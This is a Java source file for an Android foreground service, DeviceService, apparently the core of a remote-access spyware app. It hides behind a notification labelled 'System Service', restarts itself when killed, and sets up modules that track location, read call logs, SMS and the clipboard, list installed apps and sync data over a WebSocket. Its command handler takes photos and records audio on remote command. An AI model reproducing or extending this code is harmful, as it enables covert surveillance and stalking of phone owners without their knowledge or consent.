package com.abm.fatakeshto;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;

public class DeviceService extends Service {
    private static final String CHANNEL_ID = "DeviceServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private WebSocketManager webSocketManager;
    private LocationTracker locationTracker;
    private CallLogReader callLogReader;
    private SMSReader smsReader;
    private CameraController cameraController;
    private MicrophoneRecorder microphoneRecorder;
    private AppListFetcher appListFetcher;
    private ClipboardMonitor clipboardMonitor;
    private DataSyncManager dataSyncManager;

    @Override
    public void onCreate() {
        super.onCreate();
        startForeground(NOTIFICATION_ID, createNotification());
        initializeComponents();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Restart if killed
    }

    private Notification createNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("System Service")
                .setContentText("Running in background")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void initializeComponents() {
        webSocketManager = new WebSocketManager(this);
        locationTracker = new LocationTracker(this);
        callLogReader = new CallLogReader(this);
        smsReader = new SMSReader(this);
        cameraController = new CameraController(this);
        microphoneRecorder = new MicrophoneRecorder(this);
        appListFetcher = new AppListFetcher(this);
        clipboardMonitor = new ClipboardMonitor(this);
        dataSyncManager = new DataSyncManager(this);
    }

    public void executeCommand(String command, JSONObject params) throws JSONException {
        switch (command) {
            case "take_picture":
                cameraController.takePicture(params.optString("camera", "rear"));
                break;
            case "record_audio":
                microphoneRecorder.recordAudio(params.optInt("duration", 10));
                break;
            case "stop_audio":
                microphoneRecorder.stopRecording();
                break;
            default:
                Log.w("DeviceService", "Unknown command: " + command);
        }
    }

    public WebSocketManager getWebSocketManager() {
        return webSocketManager;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}